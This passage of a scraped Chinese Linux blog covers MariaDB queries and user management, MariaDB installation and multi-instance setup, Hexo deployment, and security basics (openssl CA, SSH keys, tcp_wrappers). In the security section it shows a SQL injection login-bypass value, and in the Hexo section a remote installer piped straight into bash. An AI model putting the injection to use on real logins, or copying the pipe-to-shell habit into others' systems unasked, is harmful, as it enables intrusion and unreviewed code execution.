[hellodb]\u0026gt; SELECT s.name as s_name,t.name as t_name FROM students as s LEFT OUTER JOIN teachers as t on s.teacherid=t.tid; MariaDB [hellodb]\u0026gt; SELECT s.name as s_name,t.name as t_name FROM students as s RIGHT OUTER JOIN teachers as t on s.teacherid=t.tid; MariaDB [hellodb]\u0026gt; SELECT st.name,sc.score FROM students as st INNER JOIN scores as sc on st.stuid=sc.stuid and score \u0026gt; (SELECT AVG(score) FROM scores); 子查询\nMariaDB [hellodb]\u0026gt; SELECT st.name,sc.score FROM students as st INNER JOIN scores as sc on st.stuid=sc.stuid and score \u0026gt; (SELECT AVG(score) FROM scores); view\n 类似shell中的别名  MariaDB [hellodb]\u0026gt; create view view_oldstu as SELECT * FROM students where age \u0026gt;50; MariaDB [hellodb]\u0026gt; SELECT * FROM view_oldstu; MariaDB [hellodb]\u0026gt; drop view view_oldstu; functions  查看函数列表： SHOW FUNCTIOIN STATUS; 查看函数定义 SHOW CREATE FUNCTION function_name 删除UDF: DROP FUNCTION function_name 调用自定义函数语法: SELECT function_name(parameter_value,\u0026hellip;)  MariaDB [db1]\u0026gt; DELIMITER // -\u0026gt; CREATE FUNCTION deleteById(uid SMALLINT UNSIGNED) RETURNS VARCHAR(20) -\u0026gt; BEGIN -\u0026gt; DELETE FROM students WHERE stuid = uid; -\u0026gt; RETURN (SELECT COUNT(uid) FROM students); -\u0026gt; END// MariaDB [db1]\u0026gt; DELIMITER ; MariaDB [db1]\u0026gt; SELECT deleteById（10） MariaDB [db1]\u0026gt; SELECT * FROM mysql.proc 存储过程   存储过程优势:\n存储过程把经常使用的SQL语句或业务逻辑封装起来,预编译保存在数据库中,当需要时从数据库中直接调用,省去了编译的过程 提高了运行速度 同时降低网络数据传输量\n  存储过程与自定义函数的区别: 存储过程实现的过程要复杂一些,而函数的针对性较强 存储过程可以有多个返回值,而自定义函数只有一个返回值 存储过程一般独立的来执行,而函数往往是作为其他SQL语句的一部分来使用\n  存储过程和函数中可以使用流程控制来控制语句的执行\n  流程控制：  如下： IF：用来进行条件判断。根据是否满足条件，执行不同语句 CASE：用来进行条件判断，可实现比IF语句更复杂的条件判断 LOOP：重复执行特定的语句，实现一个简单的循环 LEAVE：用于跳出循环控制 ITERATE：跳出本次循环，然后直接进入下一次循环 REPEAT：有条件控制的循环语句。当满足特定条件时，就会跳出循环语句 WHILE：有条件控制的循环语句  MySQL用户和权限管理 用户   元数据数据库：mysql\n  系统授权表：\n  db, host, user\n  columns_priv, tables_priv, procs_priv, proxies_priv\n      用户账号：\n \u0026lsquo;USERNAME\u0026rsquo;@\u0026lsquo;HOST\u0026rsquo;： @\u0026lsquo;HOST\u0026rsquo;: 主机名； IP地址或Network; 通配符： %, _: 172.16.%.%    MariaDB [mysql]\u0026gt; create user hong@\u0026#39;192.168.1.11\u0026#39; identified by \u0026#39;centos\u0026#39;; MariaDB [mysql]\u0026gt; RENAME USER old_user_name TO new_user_name MariaDB [mysql]\u0026gt; DROP USER \u0026#39;\u0026#39;@\u0026#39;localhost\u0026#39;;\t#删除空用户 MariaDB [mysql]\u0026gt; DROP USER \u0026#39;USERNAME\u0026#39;@\u0026#39;HOST 密码 正常修改密码\nMariaDB [mysql]\u0026gt; SET PASSWORD FOR 'user'@'host' = PASSWORD(‘password'); MariaDB [mysql]\u0026gt; UPDATE mysql.user SET password=PASSWORD('password') WHERE clause; MariaDB [mysql]\u0026gt; FLUSH PRIVILEGES; $ mysqladmin -u root –poldpass password 'newpass' 忘记管理员密码的解决办法\n$systemctl stop mariadb $vim /etc/my.cnf [mysqld] --skip-grant-tables $systemctl restart mariadb $mysql MariaDB [mysql]\u0026gt; update user set password=password('centos6') where user='root' ; $sed -i 's/--skip-grant-tables//' /etc/my.cnf #删除刚添加的那行 $systemctl restart mariadb $mysql -pcentos6 权限 MariaDB[hellodb]\u0026gt; grant all on hellodb.* to hong@\u0026#39;192.168.1.%\u0026#39;; MariaDB[hellodb]\u0026gt; grant select,insert on hellodb.* to mage@\u0026#39;%\u0026#39; identified by \u0026#39;centos\u0026#39;; MariaDB[hellodb]\u0026gt; show grants for mage@\u0026#39;%\u0026#39;; MariaDB[hellodb]\u0026gt; show grants for hong@\u0026#39;192.168.1.%\u0026#39;; MariaDB[hellodb]\u0026gt; REVOKE SELECT ON hellodb.* FROM \u0026#39;mage\u0026#39;@\u0026#39;%; MariaDB[hellodb]\u0026gt; FLUSH PRIVILEGES;  注意：MariaDB服务进程启动时会读取mysql库中所有授权表至内存    GRANT或REVOKE等执行权限操作会保存于系统表中，MariaDB的服务进 程通常会自动重读授权表，使之生效\n  对于不能够或不能及时重读授权表的命令，可手动让MariaDB的服务进程 重读授权表：MariaDB[hellodb]\u0026gt; FLUSH PRIVILEGES;\n  参考官方授权\n练习 1.练习一 导入hellodb.sql生成数据库:\n  在students表中，查询年龄大于25岁，且为男性的同学的名字和年龄 以ClassID为分组依据，显示每组的平均年龄 显示第2题中平均年龄大于30的分组及平均年龄 显示以L开头的名字的同学的信息 显示TeacherID非空的同学的相关信息 以年龄排序后，显示年龄最大的前10位同学的信息 查询年龄大于等于20岁，小于等于25岁的同学的信息   answer:\n  SELECT Name,Age FROM students WHERE Age \u0026gt;25 AND Gender='M';\n  SELECT avg(age),ClassID FROM students WHERE ClassID IS NOT NULL GROUP BY ClassID ;\n  SELECT avg(Age),ClassID FROM students WHERE ClassID IS NOT NULL GROUP BY ClassID HAVING avg(Age) \u0026gt; 30;\n  MariaDB [hellodb]\u0026gt; SELECT * FROM students WHERE Name LIKE 'L%';\n  MariaDB [hellodb]\u0026gt; SELECT * FROM students WHERE TeacherID IS NOT NULL;\n  MariaDB [hellodb]\u0026gt; SELECT * FROM students ORDER BY Age DESC LIMIT 10;\n  3种方法\nMariaDB [hellodb]\u0026gt; SELECT * FROM students WHERE Age \u0026gt;=20 AND Age \u0026lt;=25; MariaDB [hellodb]\u0026gt; SELECT * FROM students WHERE Age BETWEEN 20 AND 25; MariaDB [hellodb]\u0026gt; SELECT * FROM students WHERE Age IN (20,21,22,23,24,25);   2.练习二 导入hellodb.sql，以下操作在students表上执行\n  以ClassID分组，显示每班的同学的人数 以Gender分组，显示其年龄之和 以ClassID分组，显示其平均年龄大于25的班级 以Gender分组，显示各组中年龄大于25的学员的年龄之和 显示前5位同学的姓名、课程及成绩 显示其成绩高于80的同学的名称及课程； 求前8位同学每位同学自己两门课的平均成绩，并按降序排列 显示每门课程课程名称及学习了这门课的同学的个数 显示其年龄大于平均年龄的同学的名字 显示其学习的课程为第1、2，4或第7门课的同学的名字 显示其成员数最少为3个的班级的同学中年龄大于同班同学平均年龄的同学 统计各班级中年龄大于全校同学平均年龄的同学   answers：\n  SELECT count(StuID),ClassID FROM students GROUP BY ClassID ;\n  SELECT sum(Age),Gender FROM students GROUP BY Gender ;\n  SELECT avg(Age),ClassID FROM students GROUP BY ClassID HAVING avg(Age) \u0026gt; 25;\n  SELECT sum(Age),Gender FROM students WHERE Age \u0026gt; 25 GROUP BY Gender ;\n  SELECT s.Name,courses.Course,scores.Score FROM (select * from students limit 5) AS s LEFT JOIN scores ON scores.StuID = s.StuID LEFT JOIN courses ON scores.CourseID =courses.CourseID;   SELECT Name,Course,Score FROM (students LEFT JOIN scores ON students.StuID=scores.StuID ) LEFT JOIN courses ON courses.CourseID=scores.CourseID WHERE Score \u0026gt; 80;   SELECT Name,avg(Score) FROM (SELECT * FROM students LIMIT 8) AS rj LEFT JOIN scores AS jr ON rj.StuID=jr.StuID GROUP BY Name ORDER BY avg(Score) DESC;   SELECT courses.Course,count(rj.StuID) FROM scores AS rj LEFT JOIN courses ON courses.CourseID=rj.CourseID GROUP BY rj.CourseID;   SELECT Name,Age FROM students WHERE Age \u0026gt; (SELECT avg(Age) FROM students);   SELECT rj.Name,scores.CourseID FROM students AS rj LEFT JOIN scores ON scores.StuID = rj.StuID WHERE scores.CourseID IN (1,2,4,7)   SELECT students.name,students.age,tp.classid,tp.avga FROM students,(SELECT classid,COUNT(stuid) AS cs,AVG(age) AS avga FROM students GROUP BY classid HAVING cs \u0026gt;=3) AS tp WHERE students.age\u0026gt;tp.avga AND students.classid=tp.classid;   SELECT rj.Name,rj.Age FROM students AS rj LEFT JOIN classes AS jr ON rj.ClassID=jr.ClassID WHERE rj.ClassID=jr.ClassID AND Age \u0026gt; (SELECT AVG(Age) FROM students);   ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-mysql-02/","tags":["Linux","数据库原理"],"title":"MYSQL数据库原理及操作"},{"categories":["mysql"],"contents":"安装MariaDB yum 安装mariadb centos7.4系统光盘带的是5.5\n$yum install mariadb-server -y -q $rpm -q --scripts mysql-server\t#安装前脚本 $ll /var/lib/mysql/ centos7.4二进制安装mariadb-10.2.15 1.准备用户，解压缩包\n$useradd -r -d /data/mysqldb -s /sbin/nologin mysql $tar xvf mariadb-10.2.15-linux-x86_64.tar.gz -C /usr/local 2.准备二进制的程序\n$cd /usr/local $ln -s mariadb-10.2.15-linux-x86_64/ mysql $chown -R root:root /usr/local/mysql/\t#修改文件的所属组 $setfacl -R -m u:mysql:rwx /usr/local/mysql/ $echo PATH=/usr/local/mysql/bin:$PATH \u0026gt;/etc/profile.d/mysql.sh 3.准备数据目录:\n建议逻辑卷，添加新硬盘/dev/sdb\n$echo '- - -' \u0026gt; /sys/class/scsi_host/host2/scan $lsblk $pvcreate /dev/sdb $vgcreate vg0 /dev/sdb $lvcreate -n lv_mysql -l 100%FREE vg0 $mkfs.xfs /dev/vg0/lv_mysql $vim /etc/fstab\t#增加自动挂载,避免重启挂载，mount /dev/vg0/lv_mysql /data $mount -a\t#挂载 $mkdir /data/mysqldb -pv $chown mysql.mysql /data/mysqldb $chmod 770 /data/mysqldb\t#改变权限，更安全 4.创建数据库文件及配置文件\n$cd /usr/local/mysql/ $scripts/mysql_install_db --datadir=/data/mysqldb --user=mysql Installing MariaDB/MySQL system tables in '/data/mysqldb' ... OK ··· $ll /data/mysqldb/\t#生成数据库文件 $cp /etc/my.cnf /etc/my.cnf.bak $cp /usr/local/mysql/support-files/my-huge.cnf /etc/my.cnf $vim /etc/my.cnf [client] socket=/tmp/mysql.sock [mysqld] datadir=/data/mysqldb socket=/tmp/mysql.sock 5.启动服务及安全初始化\n$cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld $chkconfig --add mysqld $ service mysqld start Starting mysqld (via systemctl): [ OK ] $/user/local/mysql/bin/mysql_secure_installation\t#安全加护 源码编译安装mariadb-10.2.15 1.编译前准备\n$yum install bison bison-devel zlib-devel libcurl-devel libarchive-devel boost-devel gcc gcc-c++ cmake ncurses-devel gnutls-devel libxml2-devel openssl-devel libevent-devel libaio-devel -y $yum install -y cmake $useradd -r -d /data/mysqldb -s /sbin/nologin mysql $mkdir /data/mysqldb -pv $mkdir /app/mysql -pv $setfacl -R -m u:mysql:rwx /app/mysql $chown mysql.mysql /data/mysqldb $chmod 770 /data/mysqldb 2.编译安装阶段，使用cmake\n$tar -xf mariadb-10.2.15.tar.gz $cd mariadb-10.2.15/ $cmake . \\ -DCMAKE_INSTALL_PREFIX=/app/mysql \\ -DMYSQL_DATADIR=/data/mysqldb/ \\ -DSYSCONFDIR=/etc \\ -DMYSQL_USER=mysql \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_ARCHIVE_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITH_PARTITION_STORAGE_ENGINE=1 \\ -DWITHOUT_MROONGA_STORAGE_ENGINE=1 \\ -DWITH_DEBUG=0 \\ -DWITH_READLINE=1 \\ -DWITH_SSL=system \\ -DWITH_ZLIB=system \\ -DWITH_LIBWRAP=0 \\ -DENABLED_LOCAL_INFILE=1 \\ -DMYSQL_UNIX_ADDR=/app/mysql/mysql.sock \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci $make -j 3 \u0026amp;\u0026amp; make install \u0026amp;\u0026amp; for i in {1..5};do echo -e \u0026quot;\\a\u0026quot; ;done 3.编译后的相关配置\n$cd /app/mysql $scripts/mysql_install_db --datadir=/data/mysqldb --user=mysql --basedir=/app/mysql $cp /app/mysql/support-files/my-huge.cnf /etc/my.cnf $vim /etc/my.cnf [mysqld] datadir\t= /data/mysqldb $cp /app/mysql/support-files/mysql.server /etc/init.d/mysqld $chkconfig --add mysqld $service mysqld start MariaDB简单多实例实现 创建多实例的文件目录 $yum install mariadb-server -y $mkdir /mysqldb/{3306,3307,3308}/{etc,socket,pid,log,data} -pv $chown -R mysql.mysql /mysqldb/ $mysql_install_db --datadir=/mysqldb/3306/data --user=mysql $mysql_install_db --datadir=/mysqldb/3307/data --user=mysql $mysql_install_db --datadir=/mysqldb/3308/data --user=mysql 配置相关多实例的配置文件 $vim /etc/my.cnf [mysqld] port=3306 datadir=/mysqldb/3306/data socketdir=/mysqldb/3306/socket/mysql.sock [mysqld_safe] log-error=/mysqldb/3306/log/mariadb.log pid-file=/mysqldb/3306/pid/mariadb.pid $cp /etc/my.cnf /mysqldb/3306/etc/ $cp /etc/my.cnf /mysqldb/3307/etc/ $cp /etc/my.cnf /mysqldb/3308/etc/ $vim /mysqldb/3307/etc/my.cnf :%s/3306/3307/g $vim /mysqldb/3308/etc/my.cnf :%s/3306/3308/g 编辑多实例的服务脚本 $vim /mysqldb/3306/mysqld #编辑启动脚本 #!/bin/bash port=3306 mysql_user=\u0026quot;root\u0026quot; mysql_pwd=\u0026quot;\u0026quot; cmd_path=\u0026quot;/app/mysql/bin\u0026quot; mysql_basedir=\u0026quot;/mysqldb\u0026quot; mysql_sock=\u0026quot;${mysql_basedir}/${port}/socket/mysql.sock\u0026quot; function_start_mysql() { if [ ! -e \u0026quot;$mysql_sock\u0026quot; ];then printf \u0026quot;Starting MySQL...\\n\u0026quot; ${cmd_path}/mysqld_safe --defaults-file=${mysql_basedir}/${port}/etc/my.cnf \u0026amp;\u0026gt; /dev/null \u0026amp; else printf \u0026quot;MySQL is running...\\n\u0026quot; exit fi } function_stop_mysql() { if [ ! -e \u0026quot;$mysql_sock\u0026quot; ];then printf \u0026quot;MySQL is stopped...\\n\u0026quot; exit else printf \u0026quot;Stoping MySQL...\\n\u0026quot; ${cmd_path}/mysqladmin -u ${mysql_user} -p${mysql_pwd} -S ${mysql_sock} shutdown fi } function_restart_mysql() { printf \u0026quot;Restarting MySQL...\\n\u0026quot; function_stop_mysql sleep 2 function_start_mysql } case $1 in start) function_start_mysql ;; stop) function_stop_mysql ;; restart) function_restart_mysql ;; *) printf \u0026quot;Usage: ${mysql_basedir}/${port}/bin/mysqld {start|stop|restart}\\n\u0026quot; esac $chmod 700 /mysqldb/{3306,3307,3308}/mysqld $/mysqldb/3306/mysqld start $/mysqldb/3307/mysqld start $/mysqldb/3308/mysqld start $ ss -ntl State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 50 *:3307 *:* LISTEN 0 50 *:3308 *:* LISTEN 0 128 *:111 *:* LISTEN 0 5 192.168.122.1:53 *:* LISTEN 0 128 *:22 *:* LISTEN 0 128 127.0.0.1:631 *:* LISTEN 0 50 *:3306 *:* LISTEN 0 128 :::111 :::* LISTEN 0 128 :::22 :::* LISTEN 0 128 ::1:631\t:::* $mysql -S /mysqldb/3306/socket/mysql.sock MariaDB [(none)]\u0026gt; show variables like '%port%'; +-------------------------------------+-------+ | Variable_name | Value | +-------------------------------------+-------+ | extra_port | 0 | | innodb_import_table_FROM_xtrabackup | 0 | | innodb_support_xa | ON | | large_files_support | ON | | port | 3306 | | progress_report_time | 5 | | report_host | | | report_password | | | report_port | 3306 | | report_user | | +-------------------------------------+-------+ 10 rows in set (0.00 sec) MariaDB [(none)]\u0026gt; SELECT user,host,password FROM mysql.user; MariaDB [(none)]\u0026gt; update mysql.user set password=password(\u0026quot;centos\u0026quot;) where user=\u0026quot;root\u0026quot;; MariaDB [(none)]\u0026gt; flush privileges; #使密码生效 MariaDB [(none)]\u0026gt; \\s #等价status ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-mysql-01/","tags":["Linux","mysql","mariaDB"],"title":"MYSQL安装及多实例"},{"categories":["hexo"],"contents":"hexo简易部署到云主机 写在前面 一开始将自己hexo部署到github，结果发现打开页面速度有点慢，然后又将其同时部署到coding,实现双线路访问，国内解析记录到coding，国外解析到github，这样确实网站的速度能提高不少，但是国内访问因为是经过coding，所以打开网站会有广告，这点不能容忍，于是想到自己的服务器也还空闲着，于是想到可以部署到自己的服务器上，折腾开始 。\n简易部署思想  云主机上直接利用hexo，generate生成静态页面文件夹public，然后利用apche或者nginx服务，直接指向pubilc文件，从而简易实现部署，不需要利用GIT仓库中转。  在云主机上搭建一个git裸仓库，然后使用nginx作为网页服务器，就可以轻松将Hexo博客通过git部署到云主机上。 这个方法有种周转的意思，既然是自己的主机，直接可以利用上诉思想。    Hexo 简介 Hexo 是一个 Node.js 编写的静态网站生成器。Hexo 主要用来做博客框架，同时 Hexo 也整合了将静态网站部署到 Github 的功能，所以也很适合用来做 Github 项目的文档。\n我们可以使用 Hexo，根据写好的 HTML 布局（既 Hexo 的主题），将 MarkDown 文件生成成主题对应的静态 html/css/js 文件。Hexo 提供了将静态文件部署到 Github 分支上的配置。也就是说，我们可以使用 MarkDown 来维护文档，当写好部署配置之后，使用一个命令就可以将文档生成并发布到 Github 的 gh-pages 分支上。\n服务器部署(推荐) 服务器端安装hexo centos6.9 直接yum安装npm会各种报错，下面这种用nvm安装npm不仅不报错，速度还可以\n$ wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash $ . .bashrc $ nvm install stable $ npm install -g hexo-cli cnetos7.4 简单省事的方法可以按照cnetos6.9的方法，但是用惯了yum的同学还是习惯这个\n$ yum install -y npm $ npm install -g hexo-cli 安装ngnix $ yum install -y nginx 配置文件,修改网站根目录 $ vim /etc/nginx/nginx.conf server server { listen 80; # server_name 填写自己的域名 server_name www.fenghong.tech; # 这里root填写自己的网站根目录 root /hexo; index index.html index.php index.htm; #/usr/local/tomcat/webapps/Forum } $ systemctl start nginx #启动nginx服务 $ systemctl enable ngnix\t#开机自动启动 在hexo的家目录中生成指定的静态页面 $ cd /data $ hexo init hexo #会生成hexo文件夹 $ cd /data/hexo #进入到hexo的家目录 $ hexo g $ ln -s /data/hexo/public /hexo\t#将public文件夹指向nginx网站的根目录 DNS解析  在dns设置解析记录，设置解析A记录www解析到服务器IP地址, 解析线路默认,增加如下记录  www A\t34.231.75.23   注意：hexo的家目录的权限，否则会出现403报错.  本地云同步 在服务器端操作总会感觉到延迟，操作起来很不流畅；想了想，还是在本地主机编辑好文章，直接利用rsync推送至vps，达到同步效果。\n本地hexo主机配置 $ yum istall -y npm $ npm install -g hexo-cli $ npm install hexo-generator-search --save $ npm install hexo-generator-searchdb --save $ npm install hexo-deployer-git --save $ npm install hexo-renderer-scss --save $ cd /data $ hexo init hexo #会生成hexo文件夹 $ cd /data/hexo #进入到hexo的家目录 $ hexo g\t#生成public文件夹 推送至vps 利用rsync推送至远程主机，假设我主机IP:46.123.43.127，当然这不是我的主机。默认vps端已经安装好nginx，且主机的nginx服务器网站根目录为/www，如果未安装，请安装nginx服务器。\nrsync的具体用法了解，参见\n$vim push.sh #!/bin/bash [ \u0026#34;$1\u0026#34; == \u0026#34;clean\u0026#34; ] \u0026amp;\u0026amp; hexo clean hexo g \u0026amp;\u0026amp; rsync -v -r /data/hexo/public/ 46.123.43.127:/www $ chmod +x push.sh $ ./push.sh 我是个爱折腾的，至此，云主机搭建完毕，hexo静态页面很清爽！\n博客主题配置，及文章上传方法，请看上篇博文hexo进阶\ngit 使用rsync也算是比较不fashion的，还是用回高大上的git吧。\n使用git自动化部署博客 自动化部署主要用到了git-hooks同步\n  服务器建立裸库，这里要用git用户登录，确保git用户拥有仓库所有权\nsu git cd /var/repo/ git init --bare blog.git   使用 git-hooks 同步网站根目录 在这里我们使用的是 post-update这个钩子（也有可能是post-receive，具体进入文件就知道了），当git有收发的时候就会调用这个钩子。 在 /var/repo/blog.git 裸库的 hooks文件夹中\nvim /var/repo/blog.git/hooks/post-receive # 编辑文件，写入以下内容 #!/bin/sh git --work-tree=/var/www/hexo --git-dir=/var/repo/blog.git checkout -f 保存后，要赋予这个文件可执行权限\nchmod +x post-receive   配置_config.yml,完成自动化部署 打开_config.yml, 找到deploy，#云主机改变端口后可以按注释的。比如ssh端口为12345\ndeploy: type: git repo: github: git@github.com:oldthreefeng/oldthreefeng.github.io.git #www: ssh://git@fenghong.tech:12345/blog/blog.git www: git@fenghong.tech:/var/repo/blog.git branch: master   保存后，即可测试部署\nhexo clean \u0026amp;\u0026amp; hexo g -d  至此，我们已经成功部完成，并且访问自己的服务器端比访问github快多了，国外速度也是很好  常见问题 我在部署过程中，执行 hexo d发现部署老是出错，什么权限不允许之类的，这里我们需要检查我们在上述的git操作部署是否使用了git用户操作，若是没有，需要给相应的目录更改用户组； 使用chown -R git:git /var/repo/这条命令递归的将repo目录及其子目录用户组设置为git，同时chown -R git:git /var/www/hexo，这样即可解决此类问题.\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-hexo-easy-deploy/","tags":["hexo"],"title":"hexo简易部署到云主机"},{"categories":["safe"],"contents":"摘要：安全机制，openssl，基于key的验证，CA证书，pssh，AIDE简介, ssh端口转发\n安全机制 信息安全防护的目标\n 保密性 Confidentiality 完整性 Integrity 可用性 Usability 可控制性Controlability 不可否认性 Non-repudiation  安全防护环节\n 物理安全：各种设备/主机、机房环境 系统安全：主机或设备的操作系统 应用安全：各种网络服务、应用程序 网络安全：对网络访问的控制、防火墙规则 数据安全：信息的备份与恢复、加密解密 管理安全：各种保障性的规范、流程、方法  #不安全的登录示例 select * from user where username=\u0026quot;xxx\u0026quot; and password=\u0026quot;xxx\u0026quot; password=\u0026quot;x' or \u0026quot;1=1 安全算法(DES) 常用安全技术\n认证 授权 审计 安全通信 密码算法和协议：\n对称加密 公钥加密 单向加密 认证协议 Linux系统：OpenSSL, gpg(pgp协议的实现) 非对称加密:\n 公钥加密：密钥是成对出现\n公钥：公开给所有人；public key\n私钥：自己留存，必须保证其私密性；secret key\n特点：用公钥加密数据，只能使用与之配对的私钥解密；反之亦然\n功能：\n数字签名：主要在于让接收方确认发送方身份\n对称密钥交换：发送方用对方的公钥加密一个对称密钥后发送给对方\n数据加密：适合加密较小数据\n缺点：密钥长，加密解密效率低下\n算法：RSA（加密，数字签名）,DSA（数字签名）,ELGamal\n 算法 加密前 加密后 加密时间 解密时间 DES 1G 2G 4m 8m RSA 1G 1G 1m 64h 哈希算法\u0026mdash;-单向散列算法\nhash(data)=digest 摘要\ndigest不可反推data.\ndigest长度固定\nMD5:128 sha1:160 sha512:512\n]$ gpg 实现对称加密 ]$ gpg -c file #加密 ]$ gpg -d file #解密 ]$ gpg --gen-key ]$ gpg -a --export -o magedu.pubkey ]$ gpg --import magedu.pukey #导入mage的公钥 ]$ gpg --list-keys ]$ gpg -e -r magedu fstab #加密 ]$ gpg -o f1 -d fstab.gpg #解密 ]$ ]$ gpg --delete-keys magedu ]$ gpg --delete-secret-keys magedu A发送前的动作：Pb{data+Sa{hash(data)}}\nB接受后的动作：Sb---data+sa{hash(data)}\na1为B解封装用统一的hash运算a1=hash(data),a2=Pa-----hash(data)---digest\na1=a2,原文未被修改。\nOpenSSL OpenSSL：开源项目\n三个组件：\n openssl: 多用途的命令行工具，包openssl\nlibcrypto: 加密算法库，包openssl-libs\nlibssl：加密模块应用库，实现了ssl及tls，包nss\n openssl命令：\n 两种运行模式：交互模式和批处理模式\nopenssl version：程序版本号\n标准命令、消息摘要命令、加密命令\n标准命令：\nenc, ca, req, \u0026hellip;\n $1$O00iE0kF$XldXxBeSm6s50Pijm9yQB\n1为MD5 salt为O00iE0kF\n#生成私钥 ]$ (umask 077; openssl genrsa –out test.key –des 2048) #从私钥中提取公钥 ]$ openssl rsa -in private.key2 -pubout -out public.key2 实验：向CA申请证书 1.建立root CA ；root CA 服务器192.168.1.8上生成私钥,配置文件如下\n]$ vim /etc/pki/tls/openssl.cnf [ CA_default ] dir = /etc/pki/CA # Where everything is kept certs = $dir/certs # Where the issued certs are kept crl_dir = $dir/crl # Where the issued crl are kept database = $dir/index.txt # database index file. #unique_subject = no # Set to 'no' to allow creation of # several ctificates with same subject. new_certs_dir = $dir/newcerts # default place for new certs. certificate = $dir/cacert.pem # The CA certificate serial = $dir/serial # The current serial number crlnumber = $dir/crlnumber # the current crl number # must be commented out to leave a V1 CRL crl = $dir/crl.pem # The current CRL private_key = $dir/private/cakey.pem # The private key RANDFILE = $dir/private/.rand # private random number file x509_extensions = usr_cert # The extentions to add to the cert 2.自签名rootCA ]$ cd /etc/pki/CA ]$ (umask 077;openssl genrsa -out private/cakey.pem 4096 ) ]$ tree ]$ openssl req -new -x509 -key private/cakey.pem -out cacert.pem -days 3650 Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:test Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:ca.test.com ]$ cat cacert.pem #不同形式查看cacert.pem ]$ openssl x509 -in cacert.pem -noout -text ]$ openssl x509 -in cacert.pem -noout -dates ]$ openssl x509 -in cacert.pem -noout -issuer -new :生成新证书签署请求\n-x509: 专用于CA生成自签证书\n-key: 生成请求时用到的私钥文件\n-days n：证书的有效期限\n-out / PATH/TO/SOMECERTFILE : 证书的保存路径\n3.生成私钥及证书申请文件 服务器或用户申请证书，并将申请发送至rootCA\n]$ (umask 077;openssl genrsa -out app.key 1024) ]$ openssl req -new -key app.key -out app.scr Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:test Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:ca.testuser.com ]$ scp app.scr 192.168.1.8:/etc/pki/CA 4.CA颁发证书,并回传证书 ]$ cd /etc/pki/CA ]$ touch index.txt ]$ echo 00 \u0026gt; serial ]$ openssl ca -in app.scr -out certs/app.crt -days 100 ]$ ll certs/app.crt 基于key认证 基于密钥的登录方式\n 首先在客户端生成一对密钥（ssh-keygen） 并将客户端的公钥ssh-copy-id 拷贝到服务端 当客户端再次发送一个连接请求，包括ip、用户名 服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串，例如：acdf 服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端 得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端 服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录  基于key密钥的认证： (1) 在客户端生成密钥对\nssh-keygen -t rsa [-P ''] [-f “~/.ssh/id_rsa\u0026quot;] (2) 把公钥文件传输至远程服务器对应用户的家目录\nssh-copy-id [-i [identity_file]] [user@]host (3) 测试\n(4) 在SecureCRT或Xshell实现基于key验证\n在SecureCRT工具—\u0026gt;创建公钥—\u0026gt;生成Identity.pub文件转化为openssh兼容格式（适合SecureCRT，Xshell不需要转化格式），并复制到需登录主机上相应文件authorized_keys中,注意权限必须为600，在需登录的ssh主机上执行：\nssh-keygen -i -f Identity.pub \u0026gt;\u0026gt; .ssh/authorized_keys (5)重设私钥口令： ssh-keygen –p\n(6)验证代理（authentication agent）保密解密后的密钥\n• 这样口令就只需要输入一次\n• 在GNOME中，代理被自动提供给root用户\n• 否则运行ssh-agent bash\n(7)钥匙通过命令添加给代理 ssh-add\n实验：实现100台主机基于key的验证,实现远程管理. 批量解决多台服务器基于key的验证登录：\n]$ cat \u0026gt;\u0026gt; ip.txt \u0026lt;\u0026lt;EOF 192.168.1.6:passwd 192.168.1.7:passwd 192.168.1.8:passwd 192.168.1.9:passwd 192.168.1.10:passwd EOF ]$ vim sshkey.sh #!/bin/bash rpm -q expect \u0026amp;\u0026gt; /dev/null || yum install -y -q [ -d /root/.ssh ] \u0026amp;\u0026amp; rm -rf /root/.ssh ssh-keygen -P \u0026quot;\u0026quot; -f \u0026quot;/root/.ssh/id_rsa\u0026quot; while read line;do ip={line[%%:*]} password={line[##*:]} expect \u0026lt;\u0026lt; EOF set timeout 10 spawn ssh-copy-id $ip expect { \u0026quot;yes/no\u0026quot; { send \u0026quot;yes\\n\u0026quot;;exp_continue } \u0026quot;password\u0026quot; { send \u0026quot;$password\\n\u0026quot; } } expect eof EOF done \u0026lt; ip.txt tcp_wapper 实现安全控制 实现主机的访问控制。 客户端Client_list格式\n以逗号或空格分隔的客户端列表\n基于IP地址：192.168.10.1 192.168.1.32\n基于主机名：www.qq.com .qq.com 较少用\n基于网络/掩码：192.168.0.0/255.255.255.0\n基于net/prefixlen: 192.168.1.0/24（CentOS7）\n基于网络组（NIS 域）：@mynetwork\n内置ACL：ALL，LOCAL，KNOWN，UNKNOWN，PARANOID\n#只允许192.168.1.0/24的主机访问sshd /etc/hosts.allow sshd: 192.168.1. /etc/hosts.deny sshd :ALL 日志功能 sshd: ALL :spawn echo \u0026quot;$(date +%%F) login attempt from %c to %s,%d\u0026quot; \u0026gt;\u0026gt;/var/log/sshd.log 说明：\n 在/etc/hosts.allow中添加，允许登录，并记录日志\n在/etc/hosts.deny中添加，拒绝登录，并记录日志\n%c 客户端信息\n%s 服务器端信息\n%d 服务名\n%p 守护进程的PID\n%% 表示%\nvsftpd: 172.16. :twist /bin/echo “connection prohibited”\n AIDE  当一个入侵者进入了你的系统并且种植了木马，通常会想办法来隐蔽这个木马（除了木马自身的一些隐蔽特性外，他会尽量给你检查系统的过程设置障碍），通常入侵者会修改一些文件，比如管理员通常用ps 